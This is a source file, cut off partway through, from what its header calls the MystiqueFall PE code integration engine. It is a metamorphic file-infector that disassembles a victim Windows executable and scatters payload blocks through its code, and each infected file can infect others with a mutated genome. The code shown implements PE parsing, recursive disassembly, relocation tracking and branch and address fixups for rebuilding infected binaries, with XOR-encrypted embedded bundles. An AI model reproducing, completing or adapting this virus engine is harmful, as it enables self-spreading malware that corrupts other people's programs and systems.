// mystiquefall.mc - MystiqueFall PE code integration engine
//
// Disassembles a victim PE32's .text section, scatters payload basic blocks
// through victim code using Mistfall insertion model, reassembles a working PE.
// The infected victim carries the full Mystique backend and can infect other
// PEs via --infect <path>. Each infection recompiles with a mutated genome.

#include "../../../compiler/backend/stdlib.mc"
#include "../integrator_common.mc"

// =============================================================================
// File Layout
// =============================================================================
//   1. PE Constants & .bin Header
//   2. PE Helpers (file I/O, RVA→raw, byte reads)
//   3. PE Loader & Disassembler (validate, load_pe_info, disassemble_text)
//   4. Fixups (branches, abs code refs, external refs, reloc, entry, VA shift)
//   5. IAT Bootstrap Helpers (abs-mode preloader + import area)
//   6. Build Pipeline (build_fixed_pe — orchestrator for abs-mode)
//   7. Infect & Main
// =============================================================================

// =============================================================================
//
// PE Constants Module
//
// =============================================================================

int PE_LFANEW           = 60;     // e_lfanew offset in DOS header
int PE_NUM_SEC_OFF      = 6;      // NumberOfSections (from PE sig)
int PE_OPTHDR_SZ_OFF    = 20;     // SizeOfOptionalHeader (from PE sig)
int PE_OPT_OFF          = 24;     // optional header start (from PE sig)
int PE_ENTRY_OFF        = 40;     // AddressOfEntryPoint (from opt hdr start, i.e. PE+24+16)
int PE_IMAGEBASE_OFF    = 52;     // ImageBase (from opt hdr start)
int PE_SECALIGN_OFF     = 56;     // SectionAlignment
int PE_FILEALIGN_OFF    = 60;     // FileAlignment
int PE_IMAGESIZE_OFF    = 80;     // SizeOfImage
int PE_DATADIR_OFF      = 96;     // DataDirectory[0] (from opt hdr start)
int PE_IMPORT_DIR_IDX   = 1;      // Import = DataDirectory[1]
int PE_RELOC_DIR_IDX    = 5;      // .reloc = DataDirectory[5]
int PE_DATADIR_ENTRY_SZ = 8;      // each entry: RVA(4) + Size(4)

// Section header field offsets (40 bytes per section)
int SEC_VSIZE_OFF       = 8;
int SEC_RVA_OFF         = 12;
int SEC_RAWSIZE_OFF     = 16;
int SEC_RAWPTR_OFF      = 20;
int SEC_FLAGS_OFF       = 36;
int SEC_HDR_SIZE        = 40;

// .reloc entry format
int RELOC_TYPE_HIGHLOW   = 3;     // IMAGE_REL_BASED_HIGHLOW
int RELOC_TYPE_SHIFT     = 12;
int RELOC_OFFSET_MASK    = 0xFFF; // lower 12 bits

// File I/O constants
int GENERIC_READ         = -2147483648;   // 0x80000000 (signed-min)
int GENERIC_WRITE        = 0x40000000;
int FILE_SHARE_READ      = 1;
int OPEN_EXISTING        = 3;
int CREATE_ALWAYS        = 2;
int INVALID_HANDLE       = -1;

// =============================================================================
//
// PE Helpers Module
//
// File I/O, RVA→raw conversion, narrow-byte reads.
//
// =============================================================================

int mf_read_i16(char* buf, int offset) {
    int lo;
    int hi;
    lo = buf[offset] & 0xFF;
    hi = buf[offset + 1] & 0xFF;
    return lo | (hi << 8);
}


char* read_file(char* path, int* out_size) {
    int h;
    int sz;
    char* data;
    int rd;

    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (h == INVALID_HANDLE) {
        return 0;
    }
    sz = GetFileSize(h, 0);
    data = malloc(sz);
    ReadFile(h, data, sz, &rd, 0);
    CloseHandle(h);
    *out_size = sz;
    return data;
}

// Convert RVA to raw file offset using section table
int rva_to_raw(char* pe, int rva) {
    int pe_off;
    int num_sec;
    int opt_sz;
    int sec_start;
    int i;
    int s_rva;
    int s_vsz;
    int s_raw;

    pe_off = read_i32(pe, PE_LFANEW);
    num_sec = mf_read_i16(pe, pe_off + PE_NUM_SEC_OFF);
    opt_sz = mf_read_i16(pe, pe_off + PE_OPTHDR_SZ_OFF);
    sec_start = pe_off + PE_OPT_OFF + opt_sz;

    i = 0;
    while (i < num_sec) {
        s_rva = read_i32(pe, sec_start + i * SEC_HDR_SIZE + SEC_RVA_OFF);
        s_vsz = read_i32(pe, sec_start + i * SEC_HDR_SIZE + SEC_VSIZE_OFF);
        s_raw = read_i32(pe, sec_start + i * SEC_HDR_SIZE + SEC_RAWPTR_OFF);
        if (rva >= s_rva && rva < s_rva + s_vsz) {
            return rva - s_rva + s_raw;
        }
        i = i + 1;
    }
    return -1;
}

// Find section index that contains a given RVA (-1 if not found)
int find_section(char* pe, int rva) {
    int pe_off;
    int num_sec;
    int opt_sz;
    int sec_start;
    int i;
    int s_rva;
    int s_vsz;

    pe_off = read_i32(pe, PE_LFANEW);
    num_sec = mf_read_i16(pe, pe_off + PE_NUM_SEC_OFF);
    opt_sz = mf_read_i16(pe, pe_off + PE_OPTHDR_SZ_OFF);
    sec_start = pe_off + PE_OPT_OFF + opt_sz;

    i = 0;
    while (i < num_sec) {
        s_rva = read_i32(pe, sec_start + i * SEC_HDR_SIZE + SEC_RVA_OFF);
        s_vsz = read_i32(pe, sec_start + i * SEC_HDR_SIZE + SEC_VSIZE_OFF);
        if (rva >= s_rva && rva < s_rva + s_vsz) {
            return i;
        }
        i = i + 1;
    }
    return -1;
}

// Abs-mode payload info for build_fixed_pe
struct AbsInfo {
    char* data_sec;        // combined data section (mf + payload)
    int data_sz;           // combined data size
    char* extern_info;     // combined extern info (mf + payload)
    int extern_count;      // combined extern count
    char* bundle_buf;        // bundle data (entry_mcb + eng_mcb + pay_mcb + genome)
    int bundle_sz;           // total bundle size
    int entry_sz;          // entry.mcb bundle size (4-bundle layout)
    int eng_sz;            // engine.mcb bundle size (4-bundle layout)
    int mcb_sz;            // entry .mcb size
    int pay_sz;            // payload mcb bundle size
    int gen_sz;            // genome bundle size
    int entry_off;         // entry program entry offset in code
    int scatter_entry_off; // payload entry offset in combined code (-1 = none)
    char* scatter_abs;     // payload abs output (0 = no payload)
    int scatter_abs_sz;    // payload abs output size
    int bundle_key;          // XOR encryption key for embedded bundles
};

// =============================================================================
//
// PE Loader & Disassembler Module
//
// validate_pe, load_pe_info (parses headers + section table), process_reloc
// (.text reloc-map population), disassemble_text + build_code_chain (LDE
// recursive descent into a CodeNode chain), merge_reloc_spans.
//
// =============================================================================

struct PeInfo {
    char* data;          // raw PE file data
    int size;            // file size
    int pe_off;          // offset to PE signature (e_lfanew)
    int image_base;      // ImageBase
    int entry_rva;       // AddressOfEntryPoint
    int sec_align;       // SectionAlignment
    int file_align;      // FileAlignment
    int image_size;      // SizeOfImage
    int num_sec;         // NumberOfSections
    int opt_sz;          // SizeOfOptionalHeader
    int sec_start;       // file offset to first section header
    int text_idx;        // .text section index (-1 if not found)
    int text_rva;        // .text VirtualAddress
    int text_vsz;        // .text VirtualSize
    int text_raw;        // .text PointerToRawData
    int text_rawsz;      // .text SizeOfRawData
    int reloc_rva;       // BaseReloc DataDirectory RVA
    int reloc_sz;        // BaseReloc DataDirectory Size
    int iat_rva;         // IAT DataDirectory RVA
    int iat_sz;          // IAT DataDirectory Size
    int import_rva;      // Import DataDirectory RVA
    int import_sz;       // Import DataDirectory Size
    int va_shift;        // VA shift applied to post-.text sections (0 if none)
    int data_idx;        // .data section index (-1 if not found)
    int data_rva;        // .data VirtualAddress
    int data_vsz;        // .data VirtualSize
    int data_raw;        // .data PointerToRawData
    int data_rawsz;      // .data SizeOfRawData
    int va_shift_data;   // VA shift applied to post-.data sections (0 if none)
};

// Validate PE32: check MZ, PE sig, Machine=i386, Magic=PE32
// Returns 1 on success, 0 on failure
int validate_pe(char* data, int size) {
    int pe_off;
    int sig;
    int machine;
    int magic;

    if (size < 256) { return 0; }

    // MZ signature
    if ((data[0] & 0xFF) != 77) { return 0; }
    if ((data[1] & 0xFF) != 90) { return 0; }

    // e_lfanew
    pe_off = read_i32(data, 60);
    if (pe_off < 64) { return 0; }
    if (pe_off + 248 > size) { return 0; }

    // PE\0\0 signature = 0x00004550 = 17744
    sig = read_i32(data, pe_off);
    if (sig != 17744) { return 0; }

    // Machine = IMAGE_FILE_MACHINE_I386 = 0x14C = 332
    machine = mf_read_i16(data, pe_off + 4);
    if (machine != 332) { return 0; }

    // Magic = PE32 = 0x10B = 267
    magic = mf_read_i16(data, pe_off + 24);
    if (magic != 267) { return 0; }

    return 1;
}

// Parse PE headers into PeInfo struct
void load_pe_info(struct PeInfo* pi, char* data, int size) {
    int opt_off;
    int dd_off;
    int i;
    int sec_off;
    int sec_flags;

    pi->data = data;
    pi->size = size;
    pi->pe_off = read_i32(data, 60);

    pi->num_sec = mf_read_i16(data, pi->pe_off + 6);
    pi->opt_sz = mf_read_i16(data, pi->pe_off + 20);

    opt_off = pi->pe_off + 24;
    pi->entry_rva = read_i32(data, opt_off + 16);
    pi->image_base = read_i32(data, opt_off + 28);
    pi->sec_align = read_i32(data, opt_off + 32);
    pi->file_align = read_i32(data, opt_off + 36);
    pi->image_size = read_i32(data, opt_off + 56);

    // DataDirectory starts at opt_off + 96
    dd_off = opt_off + 96;

    // DataDirectory[5] = Base Relocation
    pi->reloc_rva = read_i32(data, dd_off + 40);
    pi->reloc_sz = read_i32(data, dd_off + 44);

    // DataDirectory[1] = Import
    pi->import_rva = read_i32(data, dd_off + 8);
    pi->import_sz = read_i32(data, dd_off + 12);

    // DataDirectory[12] = IAT
    pi->iat_rva = read_i32(data, dd_off + 96);
    pi->iat_sz = read_i32(data, dd_off + 100);

    pi->va_shift = 0;

    // Section headers
    pi->sec_start = pi->pe_off + 24 + pi->opt_sz;

    // Find .text section: first section with IMAGE_SCN_CNT_CODE (0x20 = 32)
    pi->text_idx = -1;
    i = 0;
    while (i < pi->num_sec) {
        sec_off = pi->sec_start + i * 40;
        sec_flags = read_i32(data, sec_off + 36);
        if ((sec_flags & 32) != 0 && pi->text_idx == -1) {
            pi->text_idx = i;
        }
        i = i + 1;
    }

    if (pi->text_idx >= 0) {
        sec_off = pi->sec_start + pi->text_idx * 40;
        pi->text_rva = read_i32(data, sec_off + 12);
        pi->text_vsz = read_i32(data, sec_off + 8);
        pi->text_raw = read_i32(data, sec_off + 20);
        pi->text_rawsz = read_i32(data, sec_off + 16);
    } else {
        pi->text_rva = 0;
        pi->text_vsz = 0;
        pi->text_raw = 0;
        pi->text_rawsz = 0;
    }

    // Find .data section by name: ".data\0\0\0"
    pi->data_idx = -1;
    pi->va_shift_data = 0;
    i = 0;
    while (i < pi->num_sec) {
        sec_off = pi->sec_start + i * 40;
        // Check first 5 bytes: '.','d','a','t','a'
        if ((data[sec_off] & 0xFF) == 46 && (data[sec_off + 1] & 0xFF) == 100 &&
            (data[sec_off + 2] & 0xFF) == 97 && (data[sec_off + 3] & 0xFF) == 116 &&
            (data[sec_off + 4] & 0xFF) == 97 && pi->data_idx == -1) {
            pi->data_idx = i;
        }
        i = i + 1;
    }
    if (pi->data_idx >= 0) {
        sec_off = pi->sec_start + pi->data_idx * 40;
        pi->data_rva = read_i32(data, sec_off + 12);
        pi->data_vsz = read_i32(data, sec_off + 8);
        pi->data_raw = read_i32(data, sec_off + 20);
        pi->data_rawsz = read_i32(data, sec_off + 16);
    } else {
        pi->data_rva = 0;
        pi->data_vsz = 0;
        pi->data_raw = 0;
        pi->data_rawsz = 0;
    }
}

// Scan .reloc section. For each HIGHLOW entry in .text, set reloc_map byte.
// reloc_map must be text_vsz bytes, pre-zeroed.
// Returns count of .text relocs found.
int process_reloc(struct PeInfo* pi, char* reloc_map) {
    int reloc_raw;
    int pos;
    int end;
    int page_rva;
    int block_sz;
    int num_entries;
    int i;
    int entry;
    int etype;
    int eoff;
    int target_rva;
    int count;

    if (pi->reloc_rva == 0) { return 0; }
    if (pi->reloc_sz == 0) { return 0; }

    reloc_raw = rva_to_raw(pi->data, pi->reloc_rva);
    if (reloc_raw < 0) { return 0; }

    pos = reloc_raw;
    end = reloc_raw + pi->reloc_sz;
    count = 0;

    while (pos + 8 <= end) {
        page_rva = read_i32(pi->data, pos);
        block_sz = read_i32(pi->data, pos + 4);

        if (block_sz < 8) { break; }

        num_entries = (block_sz - 8) / 2;
        i = 0;
        while (i < num_entries) {
            entry = mf_read_i16(pi->data, pos + 8 + i * 2);
            etype = (entry >> 12) & 0xF;
            eoff = entry & 0xFFF;

            if (etype == 3) {
                target_rva = page_rva + eoff;
                if (target_rva >= pi->text_rva && target_rva < pi->text_rva + pi->text_vsz) {
                    reloc_map[target_rva - pi->text_rva] = 1;
                    count = count + 1;
                }
            }
            i = i + 1;
        }

        pos = pos + block_sz;
    }

    return count;
}

// Iterative disassembly from entry point. Traces branches via work stack.
// Fills mark[offset] = instruction_length at each instruction start.
// mark must be text_vsz bytes, pre-zeroed.
// Returns number of instructions decoded.
int disassemble_text(struct PeInfo* pi, char* mark) {
    char* text;
    int text_size;
    char* work;
    int top;
    int rva;
    int off;
    int len;
    int flags;
    int target;
    int count;
    int first_byte;
    int modrm_reg;
    int reloc_raw;
    int pos;
    int end;
    int page_rva;
    int block_sz;
    int num_entries;
    int i;
    int entry;
    int etype;
    int eoff;
    int fix_rva;
    int fix_raw;
    int abs_val;
    int target_rva;
    int extra;
    int sec_off;
    int s_rva;
    int s_vsz;
    int s_raw;

    text = pi->data + pi->text_raw;
    text_size = pi->text_vsz;

    // Work stack (WORK_STACK_ENTRIES x 4 bytes = 512KB)
    work = malloc(WORK_STACK_BYTES);
    mem_set(work, 0, WORK_STACK_BYTES);
    top = 0;

    // Push entry point if it's in .text
    if (pi->entry_rva >= pi->text_rva && pi->entry_rva < pi->text_rva + text_size) {
        write_i32(work, 0, pi->entry_rva);
        top = 1;
    }

    // Also push function pointers from non-.text reloc entries that point to .text.
    // This handles _initterm tables and other indirect call targets.
    extra = 0;
    if (pi->reloc_rva > 0 && pi->reloc_sz > 0) {
        reloc_raw = rva_to_raw(pi->data, pi->reloc_rva);
        if (reloc_raw >= 0) {
            pos = reloc_raw;
            end = reloc_raw + pi->reloc_sz;
            while (pos + 8 <= end) {
                page_rva = read_i32(pi->data, pos);
                block_sz = read_i32(pi->data, pos + 4);
                if (block_sz < 8) { break; }
                num_entries = (block_sz - 8) / 2;
                i = 0;
                while (i < num_entries) {
                    entry = mf_read_i16(pi->data, pos + 8 + i * 2);
                    etype = (entry >> 12) & 0xF;
                    eoff = entry & 0xFFF;
                    if (etype == 3) {
                        fix_rva = page_rva + eoff;
                        // Any reloc entry whose value points to .text
                        fix_raw = rva_to_raw(pi->data, fix_rva);
                        if (fix_raw >= 0 && fix_raw + 4 <= pi->size) {
                            abs_val = read_i32(pi->data, fix_raw);
                            target_rva = abs_val - pi->image_base;
                            // Points to .text?
                            if (target_rva >= pi->text_rva && target_rva < pi->text_rva + text_size) {
                                off = target_rva - pi->text_rva;
                                if ((mark[off] & 0xFF) == 0 && top < WORK_STACK_ENTRIES) {
                                    write_i32(work, top * 4, target_rva);
                                    top = top + 1;
                                    extra = extra + 1;
                                }
                            }
                        }
                    }
                    i = i + 1;
                }
                pos = pos + block_sz;
            }
        }
    }

    count = 0;

    while (top > 0) {
        top = top - 1;
        rva = read_i32(work, top * 4);

        // Walk linearly from this RVA
        while (rva >= pi->text_rva && rva < pi->text_rva + text_size) {
            off = rva - pi->text_rva;

            // Already visited?
            if ((mark[off] & 0xFF) != 0) { break; }

            // Decode
            flags = 0;
            len = lde(text + off, &flags);
            if (len == 0) { break; }
            if (off + len > text_size) { break; }

            // Store instruction length (1-15)
            mark[off] = len;
            count = count + 1;

            // Check for indirect JMP (FF /4, /5) — treat as STOP
            first_byte = text[off] & 0xFF;
            if (first_byte == 0xFF && len >= 2) {
                modrm_reg = (text[off + 1] >> 3) & 7;
                if (modrm_reg == 4) {
                    // JMP r/m32 — indirect jump, stop this path
                    break;
                }
                if (modrm_reg == 5) {
                    // JMP far r/m — also stop
                    break;
                }
            }

            // Branch handling
            if ((flags & 32) != 0) {
                // Relative branch
                target = get_branch_target(text + off, rva);

                if ((flags & 64) != 0) {
                    // Unconditional (JMP): follow target
                    rva = target;
                } else {
                    // Conditional (Jcc, CALL): push target, continue fall-through
                    if (target >= pi->text_rva && target < pi->text_rva + text_size) {
                        if (top < WORK_STACK_ENTRIES && (mark[target - pi->text_rva] & 0xFF) == 0) {
                            write_i32(work, top * 4, target);
                            top = top + 1;
                        }
                    }
                    rva = rva + len;
                }
            } else if ((flags & 64) != 0) {
                // STOP but not REL (RET, HLT)
                break;
            } else {
                // Normal instruction: fall through
                rva = rva + len;
            }
        }
    }

    if (extra > 0) {
        print("  Extra seeds from .rdata func ptrs: ");
        print_int(extra);
        print("\n");
    }

    // Resync pass: scan all marked branches for targets the main walk
    // didn't reach — typically branches into VEX instructions the LDE
    // can't decode, or past data-in-code that throws off alignment.
    extra = 0;
    off = 0;
    while (off < text_size) {
        len = mark[off] & 0xFF;
        if (len > 0) {
            flags = 0;
            lde(text + off, &flags);
            if ((flags & 32) != 0) {
                target = get_branch_target(text + off, pi->text_rva + off);
                if (target >= pi->text_rva && target < pi->text_rva + text_size) {
                    if ((mark[target - pi->text_rva] & 0xFF) == 0 && top < WORK_STACK_ENTRIES) {
                        write_i32(work, top * 4, target);
                        top = top + 1;
                        extra = extra + 1;
                    }
                }
            }
            off = off + len;
        } else {
            off = off + 1;
        }
    }

    if (extra > 0) {
        print("  Resync: ");
        print_int(extra);
        print(" missed branch targets\n");

        // Walk newly discovered targets (same logic as main walk)
        while (top > 0) {
            top = top - 1;
            rva = read_i32(work, top * 4);

            while (rva >= pi->text_rva && rva < pi->text_rva + text_size) {
                off = rva - pi->text_rva;
                if ((mark[off] & 0xFF) != 0) { break; }

                flags = 0;
                len = lde(text + off, &flags);
                if (len == 0) { break; }
                if (off + len > text_size) { break; }

                mark[off] = len;
                count = count + 1;

                first_byte = text[off] & 0xFF;
                if (first_byte == 0xFF && len >= 2) {
                    modrm_reg = (text[off + 1] >> 3) & 7;
                    if (modrm_reg == 4) { break; }
                    if (modrm_reg == 5) { break; }
                }

                if ((flags & 32) != 0) {
                    target = get_branch_target(text + off, rva);
                    if ((flags & 64) != 0) {
                        rva = target;
                    } else {
                        if (target >= pi->text_rva && target < pi->text_rva + text_size) {
                            if (top < WORK_STACK_ENTRIES && (mark[target - pi->text_rva] & 0xFF) == 0) {
                                write_i32(work, top * 4, target);
                                top = top + 1;
                            }
                        }
                        rva = rva + len;
                    }
                } else if ((flags & 64) != 0) {
                    break;
                } else {
                    rva = rva + len;
                }
            }
        }
    }

    free(work);
    return count;
}

// Build a sorted CodeNode linked list from mark[] and reloc_map[].
// Creates nodes for both visited instructions and unvisited gaps.
// Returns head of chain. Also returns node count via *out_count.
struct CodeNode* build_code_chain(struct PeInfo* pi, char* mark, char* reloc_map, int* out_count) {
    struct CodeNode* head;
    struct CodeNode* tail;
    struct CodeNode* c;
    char* text;
    int text_size;
    int off;
    int len;
    int rva;
    int flags;
    int first_byte;
    int modrm_reg;
    int gap_start;
    int gap_len;
    int is_pad;
    int b;
    int j;
    int ref_rva;
    int node_count;

    text = pi->data + pi->text_raw;
    text_size = pi->text_vsz;
    head = 0;
    tail = 0;
    node_count = 0;

    off = 0;
    while (off < text_size) {
        len = mark[off] & 0xFF;

        if (len > 0) {
            // === Visited instruction ===
            rva = pi->text_rva + off;

            c = new_code_node();
            c->src = malloc(len);
            mem_copy(c->src, text + off, len);
            c->flags = FL_SEEN | FL_FREESRC;
            c->len = len;
            c->al = len;
            c->oldrva = rva;

            // LDE flags for branch/stop classification
            flags = 0;
            lde(text + off, &flags);
            if ((flags & 32) != 0) { c->flags = c->flags | FL_BRANCH; }
            if ((flags & 64) != 0) { c->flags = c->flags | FL_STOP; }

            // Indirect JMP (FF /4, /5) -> STOP
            first_byte = text[off] & 0xFF;
            if (first_byte == 0xFF && len >= 2) {
                modrm_reg = (text[off + 1] >> 3) & 7;
                if (modrm_reg == 4) { c->flags = c->flags | FL_STOP; }
                if (modrm_reg == 5) { c->flags = c->flags | FL_STOP; }
            }

            // Data-as-code detection: if a reloc entry in the preceding 3
            // bytes extends into this "instruction", it's actually part of
            // a 4-byte absolute address (e.g., jump table entry), not real
            // code.  Clear FL_BRANCH to prevent expand_short_jumps and
            // fix_branches from corrupting the data.
            if ((c->flags & FL_BRANCH) != 0 && off > 0) {
                j = 1;
                while (j <= 3 && j <= off) {
                    if (reloc_map[off - j] != 0) {
                        c->flags = c->flags - FL_BRANCH;
                        if ((c->flags & FL_STOP) != 0) {
                            c->flags = c->flags - FL_STOP;
                        }
                    }
                    j = j + 1;
                }
            }

            // Branch target RVA
            if ((c->flags & FL_BRANCH) != 0) {
                c->target_rva = get_branch_target(text + off, rva);
            }

            // Reloc annotation: check each byte for .reloc entries
            j = 0;
            while (j < len) {
                if (reloc_map[off + j] != 0) {
                    c->flags = c->flags | FL_ABSREF;
                    c->arg2 = j;
                    c->arg1 = read_i32(text, off + j);
                    // Is target in .text? (code-to-code reference)
                    ref_rva = c->arg1 - pi->image_base;
                    if (ref_rva >= pi->text_rva && ref_rva < pi->text_rva + text_size) {
                        c->flags = c->flags | FL_CODEREF;
                    }
                    // Is target in IAT? (import call)
                    if (pi->iat_rva > 0 && pi->iat_sz > 0) {
                        if (ref_rva >= pi->iat_rva && ref_rva < pi->iat_rva + pi->iat_sz) {
                            c->flags = c->flags | FL_IMPORT;
                        }
                    }
                }
                j = j + 1;
            }

            // Link into chain
            if (head == 0) {
                head = c;
                tail = c;
            } else {
                tail->next = c;
                c->prev = tail;
                tail = c;
            }
            node_count = node_count + 1;
            off = off + len;

        } else {
            // === Unvisited gap: data, alignment, or unreachable code ===
            gap_start = off;
            while (off < text_size && (mark[off] & 0xFF) == 0) {
                off = off + 1;
            }
            gap_len = off - gap_start;

            c = new_code_node();
            c->src = malloc(gap_len);
            mem_copy(c->src, text + gap_start, gap_len);
            c->flags = FL_FREESRC;
            c->len = gap_len;
            c->oldrva = pi->text_rva + gap_start;

            // Check if it's alignment padding (all 0x90 NOP or 0xCC INT3)
            is_pad = 1;
            j = 0;
            while (j < gap_len) {
                b = text[gap_start + j] & 0xFF;
                if (b != 144 && b != 204 && b != 0) {
                    is_pad = 0;
                }
                j = j + 1;
            }
            if (is_pad != 0) {
                c->flags = c->flags | FL_ALIGN;
                c->al = gap_len;
            }

            // Check for relocs in this gap
            j = 0;
            while (j < gap_len) {
                if (reloc_map[gap_start + j] != 0) {
                    c->flags = c->flags | FL_ABSREF;
                    c->arg2 = j;
                    c->arg1 = read_i32(text, gap_start + j);
                }
                j = j + 1;
            }

            // Link into chain
            if (head == 0) {
                head = c;
                tail = c;
            } else {
                tail->next = c;
                c->prev = tail;
                tail = c;
            }
            node_count = node_count + 1;
        }
    }

    *out_count = node_count;
    return head;
}

// Merge consecutive victim nodes that together hold a reloc-targeted absolute
// address.  A .reloc entry marks a 4-byte absolute value.  If the value starts
// at inner offset arg2 of node N but arg2+4 > al (original instruction length),
// the value spills into the next node(s).  Merging keeps the spanned nodes
// contiguous so fix_abs_code_refs can write the 4 bytes without crossing a
// non-contiguous boundary after scatter.
int merge_reloc_spans(struct CodeNode* head) {
    struct CodeNode* c;
    struct CodeNode* nxt;
    int orig_len;
    int nxt_orig;
    int span_needed;
    int merged;
    int total_merged;
    char* buf;

    total_merged = 0;
    c = head;
    while (c != 0) {
        if ((c->flags & FL_ABSREF) != 0) {
            orig_len = c->al;
            if (orig_len <= 0) { orig_len = c->len; }

            span_needed = c->arg2 + 4;
            if (span_needed > orig_len) {
                // 4-byte value spills past this node — merge successors
                merged = 0;
                while (c->len < span_needed && c->next != 0) {
                    nxt = c->next;
                    // Never merge with payload nodes
                    if ((nxt->flags & FL_ME) != 0) { break; }

                    nxt_orig = nxt->al;
                    if (nxt_orig <= 0) { nxt_orig = nxt->len; }

                    // Allocate combined src buffer
                    buf = malloc(c->len + nxt->len);
                    mem_copy(buf, c->src, c->len);
                    mem_copy(buf + c->len, nxt->src, nxt->len);
                    if ((c->flags & FL_FREESRC) != 0) { free(c->src); }
                    c->src = buf;
                    c->flags = c->flags | FL_FREESRC;

                    // Update lengths
                    if (c->al <= 0) { c->al = c->len; }
                    c->al = c->al + nxt_orig;
                    c->len = c->len + nxt->len;

                    // Relink: skip nxt
                    c->next = nxt->next;
                    if (nxt->next != 0) {
                        nxt->next->prev = c;
                    }

                    // Free nxt
                    if ((nxt->flags & FL_FREESRC) != 0) { free(nxt->src); }
                    free(nxt);
                    merged = merged + 1;
                }

                if (merged > 0) {
                    // Clear branch/stop flags — merged data nodes aren't branches
                    if ((c->flags & FL_BRANCH) != 0) {
                        c->flags = c->flags - FL_BRANCH;
                    }
                    if ((c->flags & FL_STOP) != 0) {
                        c->flags = c->flags - FL_STOP;
                    }
                    total_merged = total_merged + merged;
                }
            }
        }
        c = c->next;
    }
    return total_merged;
}

// =============================================================================
//
// Fixups Module
//
// Branch repair, abs/external code-ref repair, .reloc rebuild, entry-point
// patch, post-VA-shift patch passes for .data and imports.
//
// =============================================================================

// Fix branch displacements in output buffer.
// For each linked branch node, compute new displacement from new RVAs
// and write it into the output at the correct position.
// Handles range-matched links where target_rva != link->oldrva by adding
// an inner offset (target_rva - link->oldrva) to the destination.
void fix_branches(char* out, struct CodeNode* head, int text_raw) {
    struct CodeNode* c;
    int disp_sz;
    int new_disp;
    int write_off;
    int inner;
    int target_new;

    c = head;
    while (c != 0) {
        if ((c->flags & FL_BRANCH) != 0 && c->link != 0) {
            disp_sz = get_branch_disp_size(c->src);
            inner = c->target_rva - c->link->oldrva;
            target_new = c->link->newrva + inner;
            new_disp = target_new - (c->newrva + c->len);

            // Write displacement at end of instruction
            write_off = text_raw + c->newofs + c->len - disp_sz;
            if (disp_sz == 1) {
                out[write_off] = new_disp & 0xFF;
            }
            if (disp_sz == 4) {
                write_i32(out, write_off, new_disp);
            }
        }
        c = c->next;
    }
}

// Fix ALL absolute code references in output buffer by walking the original
// .reloc table. For each .text reloc entry: find the chain node, read the
// absolute value, check if it points into .text, and if so, find the target
// node and patch to the new absolute address.
void fix_abs_code_refs(char* out, struct PeInfo* pi, struct CodeNode* head,
                       int text_raw, int* skip_relocs, int* skip_count,
                       int* remapped_rvas, int* remapped_count) {
    int reloc_raw;
    int pos;
    int end;
    int page_rva;
    int block_sz;
    int num_entries;
    int i;
    int entry;
    int etype;
    int eoff;
    int fix_rva;
    struct CodeNode* src_node;
    int src_inner;
    int out_off;
    int old_abs;
    int old_target_rva;
    struct CodeNode* tgt_node;
    int tgt_inner;
    int new_abs;
    int fixed;
    struct CodeNode* nxt;
    int cross;
    int contiguous;
    int skipped;

    if (pi->reloc_rva == 0) { return; }
    if (pi->reloc_sz == 0) { return; }

    reloc_raw = rva_to_raw(pi->data, pi->reloc_rva);
    if (reloc_raw < 0) { return; }

    fixed = 0;
    skipped = 0;
    pos = reloc_raw;
    end = reloc_raw + pi->reloc_sz;

    while (pos + 8 <= end) {
        page_rva = read_i32(pi->data, pos);
        block_sz = read_i32(pi->data, pos + 4);
        if (block_sz < 8) { break; }

        num_entries = (block_sz - 8) / 2;
        i = 0;
        while (i < num_entries) {
            entry = mf_read_i16(pi->data, pos + 8 + i * 2);
            etype = (entry >> 12) & 0xF;
            eoff = entry & 0xFFF;

            if (etype == 3) {
                fix_rva = page_rva + eoff;

                // Only process .text reloc entries
                if (fix_rva >= pi->text_rva && fix_rva < pi->text_rva + pi->text_vsz) {
                    // Find chain node containing this reloc
                    src_node = find_node_by_oldrva(head, fix_rva);
                    if (src_node != 0) {
                        src_inner = fix_rva - src_node->oldrva;

                        // Cross-boundary check: if 4-byte write spills past this
                        // node, verify the next victim node is contiguous in output.
                        // Data-as-code regions (jump tables) span multiple small
                        // nodes; if payload was inserted between them, the write
                        // would corrupt payload bytes.
                        cross = 0;
                        if (src_inner + 4 > src_node->al) {
                            cross = 1;
                            contiguous = 0;
                            nxt = src_node->next;
                            if (nxt != 0) {
                                if ((nxt->flags & 2) == 0) {
                                    // Next is victim node — check output adjacency
                                    if (src_node->newofs + src_node->len == nxt->newofs) {
                                        contiguous = 1;
                                    }
                                }
                            }
                            if (contiguous == 0) {
                                skipped = skipped + 1;
                                // Record this RVA so rebuild_reloc can drop the entry
                                if (*skip_count < 256) {
                                    skip_relocs[*skip_count] = fix_rva;
                                    *skip_count = *skip_count + 1;
                                }
                            }
                        }

                        if (cross == 0) {
                            contiguous = 1;
                        }
                        if (contiguous == 1) {
                            out_off = text_raw + src_node->newofs + src_inner;

                            // Read the absolute value from output
                            old_abs = read_i32(out, out_off);
                            old_target_rva = old_abs - pi->image_base;

                            // If target is in .text, it moved — patch it
                            if (old_target_rva >= pi->text_rva && old_target_rva < pi->text_rva + pi->text_vsz) {
                                tgt_node = find_node_by_oldrva(head, old_target_rva);
                                if (tgt_node != 0) {
                                    tgt_inner = old_target_rva - tgt_node->oldrva;
                                    new_abs = pi->image_base + tgt_node->newrva + tgt_inner;
                                    write_i32(out, out_off, new_abs);
                                    fixed = fixed + 1;
                                    // Record new RVA so fix_va_shifted_refs can skip it
                                    if (*remapped_count < 16384) {
                                        remapped_rvas[*remapped_count] = src_node->newrva + src_inner;
                                        *remapped_count = *remapped_count + 1;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            i = i + 1;
        }
        pos = pos + block_sz;
    }

    if (fixed > 0) {
        print("  Fixed ");
        print_int(fixed);
        print(" code refs\n");
    }
    if (skipped > 0) {
        print("  Skipped ");
        print_int(skipped);
        print(" cross-boundary code refs (non-contiguous after insertion)\n");
    }
}

// Fix absolute code references in non-.text sections (e.g., .rdata function pointer
// tables, .data function pointers). Walks the original .reloc table for entries
// OUTSIDE .text. If the absolute value at that position points INTO .text, patches
// it to the new target address.
void fix_external_code_refs(char* out, struct PeInfo* pi, struct CodeNode* head,
                            int delta) {
    int reloc_raw;
    int pos;
    int end;
    int page_rva;
    int block_sz;
    int num_entries;
    int i;
    int entry;
    int etype;
    int eoff;
    int fix_rva;
    int fix_raw;
    int fix_raw_out;
    int old_abs;
    int old_target_rva;
    struct CodeNode* tgt_node;
    int tgt_inner;
    int new_abs;
    int fixed;
    int missed;
